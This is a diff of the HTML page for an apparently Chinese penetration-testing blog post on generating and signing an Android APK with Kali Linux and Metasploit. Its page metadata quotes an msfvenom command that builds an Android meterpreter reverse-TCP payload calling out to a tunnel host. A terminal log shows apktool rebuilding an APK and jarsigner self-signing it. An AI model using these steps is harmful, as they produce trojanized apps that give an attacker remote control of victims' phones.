@@ -16,19 +16,21 @@
 <meta property="og:site_name" content="ZapcoMan&#39;s world">
 <meta property="og:description" content="使用 Kali Linux 及 msf 生成APK 以及制作 APK签名 123msfvenom -a x86 --platform Android -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;a78dee1.r5.cpolar.top LPORT&#x3D;334 -f apk -o payload.apkmsfvenom -p...">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3e885199bccaf16ccea437.png">
 <meta property="article:published_time" content="2026-06-26T11:19:51.000Z">
-<meta property="article:modified_time" content="2026-06-26T11:26:40.703Z">
+<meta property="article:modified_time" content="2026-06-26T14:11:44.474Z">
 <meta property="article:author" content="ZapcoMan">
 <meta property="article:tag" content="APK">
 <meta property="article:tag" content="Kali  Linux">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="网络安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6a3e885199bccaf16ccea437.png">
 <link rel="canonical" href="http://example.com/2026/06/26/2026062622/">
 
 <link rel="icon" href="https://avatars.githubusercontent.com/u/66863012?s=400&amp;u=12653af0def352c0458bfcf15b96cfa21fcaf518&amp;v=4">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"生成APK 以及制作 APK签名","name":"生成APK 以及制作 APK签名 | ZapcoMan's world","description":"使用 Kali Linux 及 msf 生成APK 以及制作 APK签名 123msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=a78dee1.r5.cpolar.top LPORT=334 -f apk -o payload.apkmsfvenom -p...","url":"http://example.com/2026/06/26/2026062622/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/06/26/2026062622/","datePublished":"2026-06-26T11:19:51.000Z","dateModified":"2026-06-26T11:26:40.703Z","author":{"@type":"Person","name":"ZapcoMan"},"publisher":{"@type":"Organization","name":"ZapcoMan's world"},"keywords":"Kali Linux, 网络安全, 渗透测试, APK"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"生成APK 以及制作 APK签名","name":"生成APK 以及制作 APK签名 | ZapcoMan's world","description":"使用 Kali Linux 及 msf 生成APK 以及制作 APK签名 123msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=a78dee1.r5.cpolar.top LPORT=334 -f apk -o payload.apkmsfvenom -p...","url":"http://example.com/2026/06/26/2026062622/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/06/26/2026062622/","datePublished":"2026-06-26T11:19:51.000Z","dateModified":"2026-06-26T14:11:44.474Z","author":{"@type":"Person","name":"ZapcoMan"},"publisher":{"@type":"Organization","name":"ZapcoMan's world"},"keywords":"Kali Linux, 网络安全, 渗透测试, APK"}</script>
 
 <script>
   (function () {
@@ -441,6 +443,7 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ jarsigner -verbose -keystore sss.jks  -signedjar hhh.apk rtf.apk sss</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">Enter Passphrase for keystore: </span><br><span class="line">jarsigner error: java.lang.RuntimeException: keystore load: /home/kali/Desktop/sss.jks (No such file or directory)</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ keytool -genkeypair -alias sss -keyalg RSA -validity 100 -keystore sss.jks   </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">Enter keystore password:  </span><br><span class="line">Keystore password is too short - must be at least 6 characters</span><br><span class="line">Enter keystore password:  </span><br><span class="line">Keystore password is too short - must be at least 6 characters</span><br><span class="line">Enter keystore password:  </span><br><span class="line">Re-enter new password: </span><br><span class="line">Enter the distinguished name. Provide a single dot (.) to leave a sub-component empty or press ENTER to use the default value in braces.</span><br><span class="line">What is your first and last name?</span><br><span class="line">  [Unknown]:  Allen</span><br><span class="line">What is the name of your organizational unit?</span><br><span class="line">  [Unknown]:  SDFSDF</span><br><span class="line">What is the name of your organization?</span><br><span class="line">  [Unknown]:  WEFAADFDF</span><br><span class="line">What is the name of your City or Locality?</span><br><span class="line">  [Unknown]:  Rools</span><br><span class="line">What is the name of your State or Province?</span><br><span class="line">  [Unknown]:  SWEFSSA</span><br><span class="line">What is the two-letter country code for this unit?</span><br><span class="line">  [Unknown]:  LSRDSFD    </span><br><span class="line">Is CN=Allen, OU=SDFSDF, O=WEFAADFDF, L=Rools, ST=SWEFSSA, C=LSRDSFD correct?                                                                                </span><br><span class="line">  [no]:  yes                                                                                                                                                </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Generating 3,072 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 100 days                                                   </span><br><span class="line">        for: CN=Allen, OU=SDFSDF, O=WEFAADFDF, L=Rools, ST=SWEFSSA, C=LSRDSFD                                                                               </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ java -jar apktool_2.10.0.jar b ghj -o rtf.apk</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">I: Using Apktool 2.10.0 with 4 thread(s).</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/dir...</span><br><span class="line">I: Built apk into: rtf.apk</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ jarsigner -verbose -keystore sss.jks  -signedjar hhh.apk rtf.apk sss</span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</span><br><span class="line">Enter Passphrase for keystore: </span><br><span class="line">   adding: META-INF/MANIFEST.MF</span><br><span class="line">   adding: META-INF/SSS.SF</span><br><span class="line">   adding: META-INF/SSS.RSA</span><br><span class="line">  signing: AndroidManifest.xml</span><br><span class="line">  signing: resources.arsc</span><br><span class="line">  signing: classes.dex</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Signer</span></span><br><span class="line">    X.509, CN=Allen, OU=SDFSDF, O=WEFAADFDF, L=Rools, ST=SWEFSSA, C=LSRDSFD</span><br><span class="line">    Signature algorithm: SHA384withRSA, 3072-bit key</span><br><span class="line">    [trusted certificate]</span><br><span class="line"></span><br><span class="line">jar signed.</span><br><span class="line"></span><br><span class="line">Warning: </span><br><span class="line">The signer&#x27;s certificate is self-signed.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p> <img src="https://pic1.imgdb.cn/item/6a3e885199bccaf16ccea437.png"></p>
 
   </div>
 
@@ -512,26 +515,10 @@
     </header>
     <div class="related-paper__grid">
       
-        <a class="related-card" href="/2026/06/26/2026062621/">
-          <span class="related-card__thumb">
-            
-<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
-  
-    <img class="paper-thumb__img" src="/images/cover/camera.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
-  
-</div>
-
-          </span>
-          <span class="related-card__body">
-            <strong class="related-card__title">若依常见漏洞一把梭（下）</strong>
-            <em class="related-card__date">2026-06-26</em>
-          </span>
-        </a>
-      
         <a class="related-card" href="/2026/06/26/2026062620/">
           <span class="related-card__thumb">
             
-<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+<div class="paper-thumb paper-thumb-0 paper-thumb--cover">
   
     <img class="paper-thumb__img" src="https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR1zDBP6fjpsqreyj512zLwlmicsBwUf0CtNOwCPUDW0icgFCnvWCK4sT3icb1sfGKcuhGBLYGyT40y7gaNiaXXFSqdoA5C9AbTGtQ/640?wx_fmt=png&amp;from=appmsg" alt="若依常见漏洞一把梭（上）" loading="lazy" referrerpolicy="no-referrer">
   
@@ -540,6 +527,22 @@
           </span>
           <span class="related-card__body">
             <strong class="related-card__title">若依常见漏洞一把梭（上）</strong>
+            <em class="related-card__date">2026-06-26</em>
+          </span>
+        </a>
+      
+        <a class="related-card" href="/2026/06/26/2026062621/">
+          <span class="related-card__thumb">
+            
+<div class="paper-thumb paper-thumb-1 paper-thumb--cover">
+  
+    <img class="paper-thumb__img" src="/images/cover/mountain.webp" alt="" loading="lazy" referrerpolicy="no-referrer">
+  
+</div>
+
+          </span>
+          <span class="related-card__body">
+            <strong class="related-card__title">若依常见漏洞一把梭（下）</strong>
             <em class="related-card__date">2026-06-26</em>
           </span>
         </a>
